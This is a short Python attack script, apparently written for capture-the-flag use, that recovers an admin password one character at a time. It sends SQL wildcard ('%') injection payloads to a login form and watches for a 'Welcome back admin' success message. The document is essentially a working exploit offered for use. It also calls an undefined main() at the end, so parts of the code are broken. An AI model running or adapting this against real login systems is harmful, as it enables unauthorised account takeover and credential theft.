"""This script is nice to bruteforce a password using an SQL wildcard injection
(using the '%' at the end of a payload)
"""

import requests
import string

# The URL of the page
URL = ""
# The text that shows when the password is correct
GOOD = "Welcome back admin !"

# If the injection is based on wildcards, remove it from the charset
chars = string.printable.replace("%", "")

password = ""

while True:
    for char in chars:
        new_password = password + char

        # Add a sufix to the payload
        test = new_password + "%"

        # Data to POST
        data = {
            "username": "admin",
            "password": test
        }

        r = requests.post(URL, data=data)
        # Will print and update the current password state
        if GOOD in r.text:
            password = new_password
            print(password, end="\r")
            break

if __name__ == "__main__":
    main()
